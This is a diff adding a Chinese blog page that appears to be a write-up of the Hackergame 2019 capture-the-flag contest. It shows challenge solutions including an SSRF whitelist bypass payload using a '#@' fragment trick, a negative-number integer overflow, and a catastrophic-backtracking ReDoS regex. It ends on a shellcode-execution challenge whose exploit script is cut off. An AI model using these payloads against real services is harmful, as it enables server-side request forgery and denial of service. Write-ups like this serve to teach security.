@@ -1,0 +1,304 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>Hackergame2019 比赛记录 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="Hackergame2019 比赛记录"><meta property="og:description" content="开拓眼界了。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/hackergame2019/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-10-15T10:29:23+00:00"><meta property="article:modified_time" content="2019-10-15T10:29:23+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hackergame2019 比赛记录"><meta name=twitter:description content="开拓眼界了。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/hackergame2019/><link rel=prev href=https://blog.sigmerc.top/pwnkr-toddler/><link rel=next href=https://blog.sigmerc.top/bugku-pwn/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Hackergame2019 比赛记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/hackergame2019\/"},"genre":"posts","keywords":"Javascript, 数学, SSRF, 整数溢出, DNS, 正则表达式, 古典密码与编码","wordcount":1734,"url":"https:\/\/blog.sigmerc.top\/hackergame2019\/","datePublished":"2019-10-15T10:29:23+00:00","dateModified":"2019-10-15T10:29:23+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">Hackergame2019 比赛记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/><i class="far fa-folder fa-fw"></i>比赛记录</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2019-10-15>2019-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1734 字&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;<span id=/hackergame2019/ class=leancloud_visitors data-flag-title="Hackergame2019 比赛记录">
+<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+</span>&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png title=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#签到题>签到题</a></li><li><a href=#白与夜>白与夜</a></li><li><a href=#信息安全-2077>信息安全 2077</a></li><li><a href=#宇宙终极问题>宇宙终极问题</a><ul><li><a href=#42>42</a></li><li><a href=#everything>Everything</a></li></ul></li><li><a href=#网页读取器>网页读取器</a></li><li><a href=#达拉崩吧大冒险>达拉崩吧大冒险</a></li><li><a href=#happy-lug>Happy LUG</a></li><li><a href=#正则验证器>正则验证器</a></li><li><a href=#小巧玲珑的-elf>小巧玲珑的 ELF</a></li><li><a href=#shell-骇客>Shell 骇客</a><ul><li><a href=#1>1</a></li><li><a href=#2>2</a></li><li><a href=#3>3</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>开拓眼界了。</p><h2 id=签到题>签到题</h2><p>输入 token，F12 修改 button 属性，删掉 <code>disabled="disabled"</code> 即可。</p><h2 id=白与夜>白与夜</h2><p>下载图片直接得 flag，以前见过这类题，图片会在不同背景下显示不同图像，所以改网页背景应该也是可以的。（所以直接得到 flag 的原因可能是因为我的系统主题是黑色的）</p><h2 id=信息安全-2077>信息安全 2077</h2><p>F12 查看源码，发现需要特定的 UA 和 <code>If-Unmodified-Since</code> 请求头，因此先设定好 UA，然后利用 js 生成一个 2077 年 12 月的时间，仿照题目进行 <code>toUTCString</code> 转换就是需要的 <code>If-Unmodified-Since</code> 头，最后 POST 即可。</p><h2 id=宇宙终极问题>宇宙终极问题</h2><h3 id=42>42</h3><p><a href=https://www.sciencealert.com/the-sum-of-three-cubes-problem-has-been-solved-for-42 target=_blank rel="noopener noreffer">参考链接</a></p><p>这也太<strong>新</strong>了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-80538738812075974
+</span></span><span class=line><span class=cl>80435758145817515
+</span></span><span class=line><span class=cl>12602123297335631
+</span></span></code></pre></td></tr></table></div></div><h3 id=everything>Everything</h3><p>又要靠 <a href=https://www.alpertron.com.ar/NUMBERT.HTM target=_blank rel="noopener noreffer">神仙网站</a> 救命了。</p><h2 id=网页读取器>网页读取器</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>send_from_directory</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>  <span class=c1># well, requests is designed for humans, and I like it.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>whitelist_hostname</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;example.com&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                     <span class=s2>&#34;www.example.com&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>whitelist_scheme</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;http://&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_hostname</span><span class=p>(</span><span class=n>url</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>whitelist_scheme</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>url</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>i</span><span class=p>):]</span>  <span class=c1># strip scheme</span>
+</span></span><span class=line><span class=cl>            <span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;@&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>:]</span>  <span class=c1># strip userinfo</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>url</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=p>[:</span><span class=n>url</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)]</span>  <span class=c1># strip parts after authority</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>url</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=p>[:</span><span class=n>url</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)]</span>  <span class=c1># strip port</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>url</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>whitelist_hostname</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>(</span><span class=kc>False</span><span class=p>,</span><span class=s2>&#34;hostname </span><span class=si>{}</span><span class=s2> not in whitelist&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=kc>True</span><span class=p>,</span><span class=s2>&#34;ok&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kc>False</span><span class=p>,</span><span class=s2>&#34;scheme not in whitelist, only </span><span class=si>{}</span><span class=s2> allowed&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>whitelist_scheme</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/request&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>req_route</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>status</span><span class=p>,</span> <span class=n>msg</span> <span class=o>=</span> <span class=n>check_hostname</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>status</span> <span class=ow>is</span> <span class=kc>False</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># print(msg)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>msg</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;We tried accessing your url, but it does not return HTTP 200. Instead, it returns </span><span class=si>{}</span><span class=s2>.&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>Timeout</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;We tried our best, but it just timeout.&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;While accessing your url, an exception occurred. There may be a problem with your url.&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/source&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_source</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>send_from_directory</span><span class=p>(</span><span class=s2>&#34;/static/&#34;</span><span class=p>,</span> <span class=s2>&#34;app.py&#34;</span><span class=p>,</span> <span class=n>as_attachment</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=mi>8000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>经过尝试，常规 SSRF 手段绕不过这个过滤器，但是由于没有对 <code>#</code> 进行处理，可以构造 <code>http://web1/flag#@example.com</code> 使得过滤器直接忽略 <code>@</code> 前的内容，此时再进行请求，则 <code>@example.com</code> 就会被解释为 <code>fragment</code> 了。</p><h2 id=达拉崩吧大冒险>达拉崩吧大冒险</h2><p>一直以为是要对 websocket 做手脚，实际上并不能成功。这里我们提升攻击力的唯一途径就是去买鸡吃，我们在买鸡的时候 F12 一下：</p><p><figure><a class=lightgallery href=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png title="图 1" data-thumbnail=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png data-sub-html="<h2> </h2><p>图 1</p>"><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png></a><figcaption class=image-caption>图 1</figcaption></figure></p><p>发现这里的 <code>option</code> 的 <code>value</code> 是可以修改的，再看 js 代码：</p><p><figure><a class=lightgallery href=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png title="图 2" data-thumbnail=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png data-sub-html="<h2> </h2><p>图 2</p>"><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/1.png></a><figcaption class=image-caption>图 2</figcaption></figure></p><p>这里直接将 <code>option</code> 的 <code>value</code> 填进去了，并没有检验其合法性，因此我们可以修改这个 <code>value</code> 使得其变成一个很大的数，但是这会导致我们钱不够买不了。</p><p>将一个数变得很大，除了增加它的值，还可以将它减少成一个非常小的负数，最终导致溢出，这里就是用的第二种方法。</p><p>8 字节能构成的最小的整数是 <code>-9223372036854775808</code>。那么我们先买 <code>-9223372036854775808</code> 只鸡，再买 <code>-1</code> 只鸡，我们的攻击力就会变成一个非常大的数 <code>9223372036854776000</code>。</p><h2 id=happy-lug>Happy LUG</h2><p>查一下资料可以发现这是 <code>PunyCode</code>，题目中的 emoji 表情会被编码为 <code>xn--g28h</code>，因此真实域名是 <code>xn--g28h.hack.ustclug.org</code>。这个域名无法通过浏览器访问，但是却存在，说明一定存在一条对应的 DNS 记录，我们用 <code>nslookup</code> 查一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ nslookup -qt<span class=o>=</span>ANY xn--g28h.hack.ustclug.org 8.8.8.8
+</span></span></code></pre></td></tr></table></div></div><p>就可以得到 flag。注意到返回的是 “非权威记录”，这是由于 <code>ANY</code> 类型记录 <a href=https://tools.ietf.org/html/rfc8482 target=_blank rel="noopener noreffer">已经被废弃了</a>。</p><h2 id=正则验证器>正则验证器</h2><p>这些题目真的 <a href=https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/ target=_blank rel="noopener noreffer">太新了</a>。</p><p>题目限制了正则长度不超过 6，字符串长度不超过 24，要求构造一个运行时间大于 1 秒的正则。实际上就是 <a href=https://en.wikipedia.org/wiki/ReDoS target=_blank rel="noopener noreffer">ReDos 攻击</a>。我们可以直接借用 wiki 上的例子：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(a+)+$
+</span></span><span class=line><span class=cl>aaaaaaaaaaaaaaaaaaaaaaab
+</span></span></code></pre></td></tr></table></div></div><h2 id=小巧玲珑的-elf>小巧玲珑的 ELF</h2><p>IDA 打开发现有一堆字符，然后对输入进行运算后与这 45 个字符进行比对，一致则输出 <code>correct</code>，那么我们直接逆运算即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x66</span><span class=p>,</span><span class=mh>0x6E</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x6B</span><span class=p>,</span><span class=mh>0x83</span><span class=p>,</span><span class=mh>0x4E</span><span class=p>,</span><span class=mh>0x6D</span><span class=p>,</span><span class=mh>0x74</span><span class=p>,</span><span class=mh>0x85</span><span class=p>,</span><span class=mh>0x7A</span><span class=p>,</span><span class=mh>0x6F</span><span class=p>,</span><span class=mh>0x57</span><span class=p>,</span><span class=mh>0x91</span><span class=p>,</span><span class=mh>0x73</span><span class=p>,</span><span class=mh>0x90</span><span class=p>,</span><span class=mh>0x4F</span><span class=p>,</span><span class=mh>0x8D</span><span class=p>,</span><span class=mh>0x7F</span><span class=p>,</span><span class=mh>0x63</span><span class=p>,</span><span class=mh>0x36</span><span class=p>,</span><span class=mh>0x6C</span><span class=p>,</span><span class=mh>0x6E</span><span class=p>,</span><span class=mh>0x87</span><span class=p>,</span><span class=mh>0x69</span><span class=p>,</span><span class=mh>0xA3</span><span class=p>,</span><span class=mh>0x6F</span><span class=p>,</span><span class=mh>0x58</span><span class=p>,</span><span class=mh>0x73</span><span class=p>,</span><span class=mh>0x66</span><span class=p>,</span><span class=mh>0x56</span><span class=p>,</span><span class=mh>0x93</span><span class=p>,</span><span class=mh>0x9F</span><span class=p>,</span><span class=mh>0x69</span><span class=p>,</span><span class=mh>0x70</span><span class=p>,</span><span class=mh>0x38</span><span class=p>,</span><span class=mh>0x76</span><span class=p>,</span><span class=mh>0x71</span><span class=p>,</span><span class=mh>0x78</span><span class=p>,</span><span class=mh>0x6F</span><span class=p>,</span><span class=mh>0x63</span><span class=p>,</span><span class=mh>0xC4</span><span class=p>,</span><span class=mh>0x82</span><span class=p>,</span><span class=mh>0x84</span><span class=p>,</span><span class=mh>0xBE</span><span class=p>,</span><span class=mh>0xBB</span><span class=p>,</span><span class=mh>0xCD</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>46</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>v</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>	<span class=n>v</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>	<span class=n>v</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-=</span> <span class=mi>2</span><span class=o>*</span><span class=n>i</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>v</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=shell-骇客>Shell 骇客</h2><h3 id=1>1</h3><p>应该说是入门 pwn 题：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// gcc -z execstack -fPIE -pie -z now chall1.c -o chall1
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>buf</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里可以直接执行用户输入，因此只需要写入 <code>shellcode</code> 即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
